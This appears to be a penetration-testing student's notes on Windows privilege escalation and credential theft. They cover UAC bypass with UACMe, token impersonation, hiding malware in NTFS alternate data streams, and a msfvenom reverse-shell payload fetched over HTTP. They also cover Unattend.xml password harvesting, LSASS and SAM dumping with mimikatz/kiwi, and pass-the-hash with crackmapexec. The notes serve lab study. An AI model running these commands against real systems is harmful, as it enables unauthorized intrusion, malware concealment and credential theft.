# Windows Kernel
Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
- **User mode**: programs and services running in user mode have limited access to system resources and functionality.
- **Kernel Model**: this mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory. So the code that runs in kernel space will be run with the highest privileges.

> [!WARNING]
> When attempting privilege escalation via kernel exploits, interacting with the kernel may cause crashes on the system.

#### Tools and Environment
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester): this tools compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the targe. It also notifies the user if there are public exploits and Metasploit available for the missing bulletins.
	- When running the tool (e.g. `./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo ~/Desktop/win7.txt`), the exploits listed at the very top are the ones that have the highest chances of successfully being exploited. Then we can go to the next repository to find a suitable exploit.
- [Windows-Kernel-Exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master): collection of Windows Kernel exploits sorted by CVE.
- Metasploit’s `post/multi/recon/local_exploit_suggester` module.

### Bypassing UAC With UACMe

> [!INFO] About UAC
> User Account control (UAC) is a windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
> ![[Pasted image 20250218111617.png|center|300]]
>
> UAC is used to **ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrator group**.
>
> A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent promp.
>
> Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

- In order to **bypass UAC**, we will need to have access to a user account that is part of the **local administrators group** on the Windows target system.
- UAC allows a program to be **executed with administrative privileges**, consequently prompting the user for confirmation.
- UAC has various integrity levels ranging from low to high, if the UAC protection is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
- There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.
The default integrity level of UAC:
![[Pasted image 20250218115053.png|center|500]]

#### UACME
- [UACMe](https://github.com/hfiref0x/UACME) is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass windows UAC by leveraging various techniques.
- The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.
- It allows attackers to **execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool**.
- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.

##### Exploitation
1. Find a way to get initial access to the system.
2. Upload the tool executable (Akagi64.exe) to the victim (optionally also a backdoor made with msfvenom for a meterpreter), and execute it:

```meterpreter
cd C:\\
mkdir Temp
cd Temp
upload path/to/Akagi64.exe
upload path/to/backdoor.exe
```

```shell
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

### Access Token Impersonation

> [!INFO] About Windows Access Tokens
> - Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).
> - A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.
> - Access tokens are generated by the _winlogon.exe_ process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the _userinit.exe_ process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
> - Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.
> - An access token will typically be assigned one of the following security levels:
> 	- Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
> 	- Delegate-level tokens are typically created through an interactive login non Windows, primarily through a traditional login or through remote access protocols such as RDP.
> - Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
> - Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.

> [!INFO] About Windows Privileges
> - The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.
> - The following are the privileges that are required for a successful impersonation attack:
> 	- `SeAssignPrimaryToken`: this allow a user to impersonate tokens.
> 	- `SeCreateToken`: this allows a user to create an arbitrary token with administrative privileges.
> 	- `SeImpersonatePrivilege`: this allows a user to create a process under the security context of another user typically with administrative privileges.

> [!INFO] Meterpreter’s Incognito Module
> - Incognito is a built-in meterpreter module that was originally a standalone applicatoin that allows you to impersonate tokens after successful exploitation.
> - We can use the incognito module to display a list of available tokens that we ca impersonate.

#### Exploitation
1. Obtain initial access to the target (in the lab we exploit Rejetto HFS) with a meterpreter.
2. Check that we have `SeImpersonatePrivilege` privilege.
3. Load incognito module in the meterpreter with `load incognito`.
4. List tokens with `list_tokens -u`.
5. Impersonate a token with `impersonate_token "ATTACKDEFENSE\Administrator"`
6. Now we have the administrator account. We can get more privileges by accessing a privileged process.
	1. Find the process with `pgrep explorer`.
	2. Copy the pid of the process and migrate with `migrate <pid>`.

> [!WARNING]
> There may be the case where there are no privileged access tokens. In this case, we need to use the potato attack. This attack will generate an NT AUTHORITY\SYSTEM access token that we can then impersonate to obtain privileges.

## File System Vulnerabilities
### Alternate Data Streams (ADS)
- An NTFS (New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System).
- Any file created on an NTFS formatted drive will have two different forks/streams:
	- Data stream: default stream that contains that data of the file.
	- Resource stream: typically contains the metadata of the file.
- Attackers can use ADS (also knows as attribute resource stream) to hide malicious code or executables in legitimate files in order to evade detection.
- This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file.

Hide an executable in an alternate stream of a benign looking file:

```sh
file malware.exe > windowslog.txt:secret
```

Then run the malware:

```sh
start windowslog.txt:malware.exe
```

Create a symbolic link (acceso directo):

```PowerShell
mklink wupdate.exe C:\Temp\windowslog.txt:malware.exe
# Now we can run wupdate.exe
wupdate.exe
```

## Windows Credential Dumping
- The windows OS stores hashed user accounts passwords locally in the SAM (Security Accounts Manager) database.
- Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA)
- Windows versions up to Windows Server 2003 utilize two different types of hashes:
	- LM
	- **NTLM**
- Windows disables LM hashing and utilizes NTLM hashing from Window Vista onwards.

### SAM Database
- SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords in on Windows. All user accounts passwords stored in the SAM database are hashed.
- The SAM database file cannot be copied while the operating system is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
- In modern versions of Windows, the SAM database is encrypted with syskey.

> [!NOTE]
> Elevated/Administrative privileges are required in order to access and interact with the LSASS process.

### Windows hashes
#### LM (LanMan)
- LM is the default hashing algorithm that was implemented in Windows operating systems prior to NT 4.0.
- The protocol is used to hash user passwords, and the hashing process can be broken down into the following steps:
	1. The password is broken into two seven-character chunks.
	2. All characters are then converted into uppercase.
	3. Each chunk is then hashed with the DES algorithm.
- LM hashing is generally considered to be a weak protocol and can easily be cracked, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes.
![[Pasted image 20250225203414.png|center]]

#### NTLM (NTHash)
- NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
- From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.
- When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
- NTLM improves upon LM in the following ways:
	- Does not split the hash in to two chunks.
	- Case sensitive.
	- Allows the use of symbols and unicode characters.
- It is also important to mention that NTLM hashes are stored in the SAM database without SALT.
![[Pasted image 20250225203939.png|center]]

### Searching for Passwords in Windows Configuration Files
- Windows can automate a variety of repetitive tasks such as the mass rollout or installation of Windows on many systems.
- This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass installation/deployment of Windows on system.
- This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account’s password.
- If the Unattended Windows Setup configuration files are left on the target system after installation, **they can reveal user account credentials** that can be used by attackers to authenticate with Windows target legitimately.

### Unattended Windows Setup
- The unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
	- _C:\Windows\Panther\Unattend.xml_
	- _C:\Windows\Panther\Autounattend.xml_
- As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.

#### Attack process
1. Gain meterpreter session. For that, create the payload:

```sh
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=<local IP> LPORT=<port> -f exe > payload.exe
```

And run a web server with python SimpleHTTPServer module:

```sh
python -m SimpleHTTPServer 80
```

On the target Windows machine, download the file:

```cmd
curl -o payload.exe http://<ip>/payload.exe
```

And now listen with multi/handler module (set payload to windows/z64/meterpreter/reverse_tcp)

1. Use the meterpreter session to find the unattended XML file and identify the password.

```shell
search -f Unattend.xml
```

(It is faster to do search it manually under *C:\\\\Windows\\Panther\\)
![[Pasted image 20250225220444.png|center]]
2. Decode it.

```sh
echo "<encoded-password>" | base64 -d
```

1. Authenticate with psexec.

```sh
impacket-psexec <user>@<host>
# Prompt for password
```

> [!NOTE]
> The password of the user may have been change

### Dumping Hashes With Mimikatz
- Mimikatz is a Windows post-exploitation tool that allows for the extraction of clear-text passwords, hashes and Kerberos tickets form memory.
- It can be used to extract hashes from the lsass.exe process memory where hashes are cached.
- We can utilize the pre-compiled mimikatz executable. Alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.

#### Exploitation
1. Get a meterpreter session.
2. Migrate to lsass process.

```sh
pgrep lsass
migrate <pid> # pid found by the previou command
```

1.  Load kiwi module with `load kiwi`
2.  If windows version is later than 8, if we run `creds_all` we will see that there are no credentials (they are displayed as (null)).
![[Pasted image 20250226143435.png|center]]
	Run `lsa_dump_sam` to dump SAM database. The SAM database is encrypted with the SysKey (also shown by the command)
	We can also use lsa_dump_secrets. This command can sometimes provide clear text credentials.
3. Upload mimikatz executable.

```sh
upload /usr/share/windows-resources/mimikats/x64/mimikatz.exe
```

1. Spawn and shell and execute uploaded mimikatz executable. Now we can start using [[Mimikatz]].

### Pass-The-Hash Attacks
- Involves capturing NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
- This technique allows to obtain access to the target system via legitimate credentials, as opposed to obtaining access via service exploitaiton.

#### Exploitation
##### Crackmapexec
With a NTLM hash:

```sh
crackmapexec smb <target IP> -u <username> -H "<NTLM hash>"
```

With a password:

```sh
crackmapexec smb <target IP> -u <username> -p "<password>"
```

Execute a command (will show some python errors, ignore them):

```sh
crackmapexec <previous flags> -x "<command>"
```

##### Metasploit
###### `PsExec` module
After setting the LPORT, RHOSTS, SMBUser, SMBPass (the full hash “…abcd:fghi…”, not just the NTLM hash) and the target (in the example of the video, the target is set to Native \\ upload), run the exploit. That should spawn a meterpreter session.

We also need to setup the SMBDomain if the user belongs to a domain.

###### `badblue_passthru` module
Once we have the meterpreter session, find the `lsass` process and migrate into it:

```sh
pgrep lsass
migrate 780
```

Check the UID (should be NT AUTHORITY\SYSTEM):

```sh
getuid
```

Load kiwi extension and dump credentials:

```sh
load kiwi
lsa_dump_sam
```

From the results, just grab the hashes of the users. We can also list the found hashes in a meterpreter session with:

```sh
hashdump
```